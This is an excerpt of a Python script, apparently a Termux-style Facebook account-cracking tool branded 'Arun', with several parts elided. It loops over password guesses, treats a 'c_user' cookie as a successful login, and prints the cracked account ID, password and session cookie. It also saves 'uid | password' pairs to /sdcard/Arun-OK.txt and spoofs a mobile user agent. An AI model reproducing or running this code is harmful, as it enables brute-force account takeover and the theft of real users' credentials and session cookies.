...
ha = current.day
today = date.today()
#Arun2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mArun')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Arun/1.2.0 OPN-B'
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Simpleergithub/adam/tree/main').text
        ff=open('show.txt','w')
...
\033[1;92m         ██║  ██║██║  ██║╚██████╔╝██║ ╚████║
 \033[1;93m        ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97mARUN    \033[1;31m:  \033[1;97mArun \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mShrestha Arun \033[1;92m     |   
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Arun_OK.mp3")
                print('\033[1;92m[Arun-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Arun-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mArun","\x1b[1;92mArun","\x1b[1;93mArun","\x1b[1;94mArun","\x1b[1;95mArun","\x1b[1;96mArun","\x1b[1;97mArun","\x1b[1;91mArun","\x1b[1;92mArun","\x1b[1;93mArun","\x1b[1;94mArun","\x1b[1;95mArun","\x1b[1;96mArun"])
